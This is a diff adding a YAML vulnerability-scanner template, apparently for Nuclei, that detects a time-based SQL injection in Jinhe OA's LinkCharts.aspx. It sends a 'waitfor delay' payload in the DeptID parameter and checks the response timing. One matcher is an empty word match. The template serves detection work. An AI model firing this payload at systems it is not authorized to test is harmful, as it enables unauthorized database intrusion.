@@ -1,0 +1,40 @@
+id: poc-yaml-jinhe-oa-linkcharts-sqli
+info:
+  name: 金和OA LinkCharts.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects SQL injection vulnerability in 金和OA LinkCharts.aspx that allows exploitation via delay-based injection.
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(3, 5)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.CrmWorkFlat/LinkCharts.aspx/?DeptID=1%27waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+
+      - type: word
+        part: header
+        words:
+          - "X-Aspnet-Version"
+
+      - type: word
+        part: body
+        words:
+          - ""
+        condition: and
